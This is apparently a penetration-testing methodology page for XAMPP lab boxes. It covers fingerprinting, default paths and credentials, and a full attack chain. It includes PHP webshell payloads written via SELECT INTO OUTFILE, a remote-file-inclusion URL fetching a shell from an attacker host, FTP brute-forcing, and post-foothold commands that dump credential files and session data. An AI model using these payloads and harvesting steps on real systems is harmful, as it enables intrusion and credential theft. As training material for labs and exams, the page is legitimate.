title: XAMPP — Default Configuration Reconnaissance and Path Conventions
body:
XAMPP is one of the most common lab-box stacks because it ships everything a developer needs for local web development — Apache + MariaDB + PHP + Perl — pre-configured, with default credentials, predictable filesystem paths, and an information-disclosure-rich default install. It's named for X (cross-platform), Apache, MariaDB, PHP, Perl. On Windows it installs to C:\xampp by default. On Linux to /opt/lampp.

If you see Apache + PHP + the XAMPP welcome page, this node is your reconnaissance map. Every time XAMPP shows up on PG/HTB/OSCP, the same patterns appear: predictable paths, default credentials in a plain-text file somewhere, exposed phpMyAdmin, and a web app under htdocs/ that's the actual target.

— FINGERPRINTING — IS THIS XAMPP? —

  THE GIVEAWAY SIGNAL: 'Welcome to XAMPP'
    Browse to http://target/ — XAMPP redirects to /dashboard/
    Page title: 'Welcome to XAMPP'
    Footer: '© 2024 Apache Friends'
    This is unambiguous. XAMPP is running.

  HEADER FINGERPRINTS:
    Server: Apache/X.Y.Z (Win64) OpenSSL/X.Y.Z PHP/X.Y.Z
    Server: Apache/X.Y.Z (Win32) OpenSSL/X.Y.Z PHP/X.Y.Z
    The (Win64) or (Win32) parenthetical is the smoking gun — it means
    Apache is running on Windows, and Windows + Apache + PHP =
    almost certainly XAMPP (the alternatives are WAMP and individual
    package installs, all rare).

  COMMON XAMPP PATHS (ALL ON DEFAULT INSTALL):
    /                           Welcome page (redirects to /dashboard/)
    /dashboard/                 Default landing page
    /phpmyadmin/                phpMyAdmin web UI (often exposed!)
    /webalizer/                 Apache log analyzer
    /security/                  Security check page
    /xampp/                     Old XAMPP path (some versions)
    /licenses/                  License files (information disclosure)
    /img/                       Images directory
    /favicon.ico                Default favicon

  VERSION DISCLOSURE:
    /dashboard/index.html shows XAMPP version in the page text
    HTTP Server header shows component versions:
      Apache version, OpenSSL version, PHP version
    /readme_en.txt (in C:\xampp\readme_en.txt — sometimes web-accessible)
      Lists exact versions of bundled components

— THE FILESYSTEM LAYOUT (CRITICAL — MEMORIZE THIS) —

  WINDOWS:
    C:\xampp\                   Root install dir
    C:\xampp\htdocs\            Web document root (Apache DocumentRoot)
    C:\xampp\htdocs\dashboard\  Default landing page
    C:\xampp\htdocs\<sitename>\ User-deployed web apps go HERE
    C:\xampp\apache\bin\        Apache binaries
    C:\xampp\apache\conf\httpd.conf    Main Apache config
    C:\xampp\php\               PHP binaries
    C:\xampp\php\php.ini        PHP configuration
    C:\xampp\mysql\             MariaDB install
    C:\xampp\mysql\bin\         MySQL binaries
    C:\xampp\mysql\data\        MySQL data directory
    C:\xampp\FileZillaFTP\      FileZilla FTP server
    C:\xampp\sendmail\          Mail relay
    C:\xampp\tmp\               Apache temp files (sessions live here!)
    C:\xampp\xampp-control.exe  GUI control panel
    C:\xampp\passwords.txt      DEFAULT CREDENTIALS FILE (gift)
    C:\xampp\readme_en.txt      Version info + setup notes

  LINUX:
    /opt/lampp/                 Root install dir
    /opt/lampp/htdocs/          Document root
    /opt/lampp/etc/httpd.conf   Apache config
    /opt/lampp/etc/php.ini      PHP config
    /opt/lampp/var/mysql/       MariaDB data
    /opt/lampp/passwords.txt    Credentials file

  When you have ANY shell on a Windows box with Apache, IMMEDIATELY check:
    cd C:\xampp\
    type passwords.txt          (default creds for everything)
    dir htdocs                  (find the deployed web apps)
    type htdocs\<app>\wp-config.php  (WordPress DB creds)
    type htdocs\<app>\.env      (modern PHP framework secrets)

— THE PASSWORDS.TXT GIFT —

  XAMPP ships with a file at C:\xampp\passwords.txt that documents EVERY
  default password for the bundled components:

    1) MySQL (phpMyAdmin):       root / (empty)
    2) FileZilla FTP:            (newly created — varies)
    3) Mercury Mail:             postmaster, admin, newuser:wampp
    4) WEBDAV:                   xampp-dav-unsecure / ppmax2011
    5) WordPress:                admin / FeltHeadwallWight357
                                 (or whatever was set during install)

  Lab boxes consistently expose this file in one of three ways:
    1. SMB share named 'Shenzi' or '<sitename>' (case-insensitive)
       containing passwords.txt as the centerpiece
    2. Anonymous FTP browse exposes it
    3. Web-accessible at /passwords.txt or /xampp/passwords.txt

  ALWAYS check for it first. It's the shortest path to admin.

— THE COMMON XAMPP-LAB ATTACK CHAIN —

  This pattern repeats across PG Practice, HTB, and OSCP-style boxes:

  1. Nmap → port 80/443 + SMB + FTP + MySQL all open
  2. Browse port 80 → /dashboard/ or 'Welcome to XAMPP'
  3. Fuzz directories → find /<sitename>/ (deployed web app, often
     WordPress, sometimes a custom PHP app)
  4. SMB enumeration → guest session reveals share with passwords.txt
  5. Read passwords.txt → WordPress admin credentials
  6. Login → theme editor → 404.php → webshell
  7. Reverse shell as <sitename> user (e.g., shenzi\shenzi)
  8. PowerUp → AlwaysInstallElevated → SYSTEM

  The beauty: every step is a known pattern, no guessing required.
  XAMPP boxes are a methodology stress test, not a creativity test.

— OTHER ATTACK SURFACES ON XAMPP —

  PHPMYADMIN AT /phpmyadmin/
    Default credentials: root / (no password)
    If reachable from outside: full DB access
    If you have DB access: SELECT...INTO OUTFILE for webshell drop
      SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE
        'C:/xampp/htdocs/shell.php';

  PHP EXECUTION VIA OUTFILE
    Once authenticated to MySQL/MariaDB (via passwords.txt or default):
    SELECT 'malicious php here' INTO OUTFILE 'C:/xampp/htdocs/x.php';
    Then visit http://target/x.php

  XAMPP CONTROL PANEL CREDENTIALS
    The xampp-control.ini file (in the SMB share or filesystem) sometimes
    contains the panel credentials in plaintext.

  EXPOSED LOG FILES
    /xampp/error.log, /apache/logs/access.log are sometimes web-readable
    via path traversal. Useful for finding internal IPs, usernames, etc.

  WEBDAV (HISTORICALLY)
    Older XAMPP versions had WebDAV enabled with default credentials
    xampp-dav-unsecure / ppmax2011
    Path: /webdav/ (or active in apache/conf/extra/httpd-dav.conf)
    Test with: cadaver http://target/webdav/

  EXPOSED SOURCE
    /<app>/.git/ exposed = git pull the entire codebase including
    config files with creds.
    Test with: curl http://target/<app>/.git/HEAD

— TRAPS AND DEAD ENDS —

  XAMPP error pages reveal versions — real version may differ from
  what HTTP headers report (mod_security or proxy can mask). When in
  doubt, force a 404 and read the error page footer.

  /security/ page exists but rarely tells you anything actionable —
  it's XAMPP's own security checklist, not a vulnerability indicator.

  phpMyAdmin auth fails sometimes even with documented passwords —
  XAMPP installers sometimes randomize root password during install.
  In that case, try harvesting from passwords.txt or wp-config.php.

  /dashboard/ shows phpinfo() link — always click it. phpinfo output
  discloses every loaded extension, all paths, and sometimes
  environment variables containing credentials.
cmd:
# ── STEP 1: CONFIRM XAMPP ─────────────────────────────
# Quick fingerprint
curl -sI http://$ip/ | grep -iE 'server|powered'
# Expected header: Server: Apache/X.Y.Z (Win64) OpenSSL/X.Y.Z PHP/X.Y.Z

# Visit dashboard — confirms XAMPP
curl -sL http://$ip/ | grep -iE 'xampp|apache friends|welcome'

# Or browser:
firefox http://$ip/dashboard/

# ── STEP 2: VERSION DISCLOSURE ────────────────────────
# Component versions from headers
curl -sI http://$ip/ | grep -iE 'apache|php|openssl'

# XAMPP version from dashboard
curl -s http://$ip/dashboard/ | grep -oE 'XAMPP [0-9.]+' | head -1

# Read full version disclosure
curl -s http://$ip/readme_en.txt 2>/dev/null | head -30
# Or via SMB after foothold:
type C:\xampp\readme_en.txt

# ── STEP 3: CHECK ALL THE STANDARD XAMPP PATHS ───────
for p in dashboard phpmyadmin webalizer security xampp licenses passwords.txt readme_en.txt webdav; do
  status=$(curl -s -o /dev/null -w '%{http_code}' http://$ip/$p)
  echo "$status  /$p"
done

# Look specifically for the gift file:
curl -s http://$ip/passwords.txt 2>/dev/null | head -20
curl -s http://$ip/xampp/passwords.txt 2>/dev/null | head -20

# ── STEP 4: DIRECTORY FUZZ FOR DEPLOYED APPS ──────────
# /htdocs/<sitename>/ pattern — fuzz top level for the actual web app
feroxbuster -u http://$ip/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -d 2 --status-codes 200,301,302,403

# Box names often hint at the deployed app:
# - Box named 'Shenzi' → check /shenzi/
# - Box named 'Banzai' → check /banzai/
# - Etc.
# (XAMPP convention: deployed apps go in C:\xampp\htdocs\<appname>\)

# Quick name-guessing one-liner using box hostname:
box=$(echo $ip | tr '.' '_')   # placeholder
for name in shenzi banzai admin app site web wordpress wp blog; do
  status=$(curl -s -o /dev/null -w '%{http_code}' http://$ip/$name/)
  echo "$status  /$name/"
done

# ── STEP 5: CHECK FOR EXPOSED SOURCE / GIT ────────────
curl -s http://$ip/.git/HEAD
curl -s http://$ip/<sitename>/.git/HEAD
# If you see 'ref: refs/heads/main' or similar — git is exposed
# Use git-dumper to grab the whole repo:
pip install git-dumper
git-dumper http://$ip/.git/ ./looted_repo

# ── STEP 6: PHPMYADMIN — TRY DEFAULTS ─────────────────
# Default XAMPP credentials: root with NO password
curl -s -c /tmp/cookies -b /tmp/cookies \
  -X POST http://$ip/phpmyadmin/index.php \
  -d 'pma_username=root&pma_password=&server=1' \
  -i | head -30
# Look for 'Set-Cookie: phpMyAdmin=' (logged in) vs 'Wrong username/password'

# Browser:
firefox http://$ip/phpmyadmin/
# Login: root / (blank password)

# ── STEP 7: SMB ENUMERATION (XAMPP BOXES OFTEN HAVE GUEST SHARES) ─
# Null session
nxc smb $ip -u '' -p '' --shares

# Guest session — often works when null fails
nxc smb $ip -u 'guest' -p '' --shares

# If guest works, look for a share named after the deployed app:
smbclient -N //$ip/<sharename>
# In smbclient:
#   recurse on
#   prompt off
#   mget *
# Then read everything you downloaded — passwords.txt is the prize.

# ── STEP 8: FTP CHECK (FILEZILLA OFTEN BUNDLED) ──────
# Anonymous first
ftp $ip
# user: anonymous, password: anything

# If anonymous fails, try defaults
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$ip

# ── STEP 9: MARIADB / MYSQL CHECK ─────────────────────
# Default XAMPP MySQL: root with no password
mysql -h $ip -u root --connect-timeout=5
# If logged in, check for files-priv:
#   SHOW VARIABLES LIKE 'secure_file_priv';
#   (empty = can write anywhere)
# Drop a webshell via INTO OUTFILE:
#   USE phpmyadmin;
#   SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE 'C:/xampp/htdocs/x.php';
# Then: curl http://$ip/x.php?c=whoami

# ── STEP 10: POST-FOOTHOLD XAMPP HARVEST ──────────────
# Once you have a shell as the web user, immediately:

# Check the entire XAMPP install
dir C:\xampp\

# Get the gift file
type C:\xampp\passwords.txt

# Get every web app's config
dir C:\xampp\htdocs\
for /R C:\xampp\htdocs\ %f in (wp-config.php) do @type %f
for /R C:\xampp\htdocs\ %f in (.env) do @type %f
for /R C:\xampp\htdocs\ %f in (config.php) do @type %f

# PHP sessions (sometimes contain logged-in users)
dir C:\xampp\tmp\ /b | findstr sess_
type C:\xampp\tmp\sess_*

# Apache config (vhosts, rewrites, hidden paths)
type C:\xampp\apache\conf\httpd.conf | findstr -i "DocumentRoot Alias VirtualHost"

# MySQL data files
dir C:\xampp\mysql\data\

# FileZilla creds (XML config)
type C:\xampp\FileZillaFTP\FileZilla Server.xml
# Hash format: MD5 with salt — crackable

# ── BONUS: DOCKERIZED XAMPP DETECTION ─────────────────
# Some labs run XAMPP in Docker — same paths but rootfs differs:
ls / 2>/dev/null | grep -iE 'opt|var'
# Look for /opt/lampp inside container, or volume-mounted /var/www/html

# ── BONUS: CRACKING FILEZILLA CREDS ───────────────────
# FileZilla Server.xml has user creds in this format:
#   <Permissions>
#     <Permission Dir="C:\Path">...</Permission>
#   </Permissions>
#   <Salt>HEX</Salt>
#   <Pass>HEX</Pass>
# The hash is SHA-512(salt + password) — hashcat mode 1500 or custom
# Crack offline; if box has FileZilla you may not need to crack —
# the WordPress creds in passwords.txt are usually the path
warn:
PASSWORDS.TXT IS THE FIRST PLACE TO LOOK — ALWAYS:
  Every XAMPP lab box exposes this file somewhere — SMB share, anonymous
  FTP, web path, or once you have any shell. It contains the WordPress
  admin credentials, MySQL root state, and any other defaults the lab
  designer left untouched. Spending 30 seconds finding this file saves
  you hours of brute-forcing.

GUEST SMB SESSION OFTEN WORKS WHEN NULL FAILS:
  XAMPP boxes frequently have:
    null session: STATUS_ACCESS_DENIED
    guest session: works
  If `nxc smb $ip -u '' -p ''` fails, IMMEDIATELY try:
    nxc smb $ip -u 'guest' -p ''
  This is a separate auth path, not the same as null.

VERSION HEADERS CAN LIE:
  XAMPP's Apache often reports a different version in headers than what's
  actually installed (proxy, mod_security, hardening). Always cross-check
  with /readme_en.txt or footer text on /dashboard/. The httpd.conf
  ServerTokens directive controls header verbosity.

INTO OUTFILE NEEDS WRITE PRIVS AND FILE_PRIV:
  The MariaDB/MySQL webshell-via-OUTFILE technique requires:
    - FILE privilege granted to the user (default: root has it)
    - secure_file_priv to be empty or include the target directory
  Modern MySQL/MariaDB defaults set secure_file_priv to a specific
  directory (usually /tmp). XAMPP's MariaDB usually leaves it empty
  (anywhere is writable). Check before assuming:
    SHOW VARIABLES LIKE 'secure_file_priv';

C:\xampp\htdocs\<sitename>\ MAY NOT BE THE FULL WEB ROOT:
  XAMPP's httpd.conf supports Alias directives, allowing /api/ to map
  to a completely different filesystem path. After foothold, always read:
    type C:\xampp\apache\conf\httpd.conf
    type C:\xampp\apache\conf\extra\httpd-vhosts.conf
  Find every Alias and DocumentRoot — there may be additional attack surface.

FILEZILLA FTP IS SEPARATE FROM XAMPP CORE — DIFFERENT CREDS:
  FileZilla Server (the FTP daemon bundled with XAMPP) has its own user
  database in C:\xampp\FileZillaFTP\FileZilla Server.xml. The passwords
  there are NOT the same as the WordPress/MySQL creds. They're a separate
  attack surface — crack the salted SHA-512 if you find the XML file.

XAMPP ON WINDOWS RUNS APACHE AS LOCAL SERVICE BY DEFAULT:
  The shell you get from a webshell is the user that Apache is running as.
  This is usually:
    - <sitename> user (if the box deployer set it up that way — Shenzi)
    - LocalService (default XAMPP setup)
    - Administrator (sloppy lab boxes)
  Different shells require different privesc paths. Always whoami first.

XAMPP DASHBOARD HAS DEMO PHP CODE THAT'S OFTEN VULNERABLE:
  /dashboard/phpinfo.php exposes phpinfo() — useful but rarely vulnerable.
  Some XAMPP versions ship demo apps in /xampp/, /licenses/, or
  /webalizer/ that have stale jQuery, file inclusion bugs, or directory
  traversal. Always fuzz these paths even after finding the main app.

PHP_INI ALLOW_URL_FOPEN AND ALLOW_URL_INCLUDE:
  XAMPP's php.ini default has allow_url_fopen=On. allow_url_include is
  usually Off, but check — if On, any LFI immediately becomes RFI:
    http://$ip/vuln.php?file=http://$kali/shell.php
  After foothold, read C:\xampp\php\php.ini to confirm.

MYSQL ROOT WITH NO PASSWORD MAY OR MAY NOT BE NETWORK-ACCESSIBLE:
  Default XAMPP MySQL listens on 0.0.0.0 with root/(blank) BUT recent
  versions add bind-address=127.0.0.1 to my.ini. If port 3306 is open
  externally on nmap and root/(blank) is the documented default, try
  it before assuming you need credentials.

choices.label: WordPress admin creds via passwords.txt — go straight to shell
Guest SMB share has passwords.txt — read it
Got shell — harvest C:\xampp for everything
Need to fuzz deeper for the app path
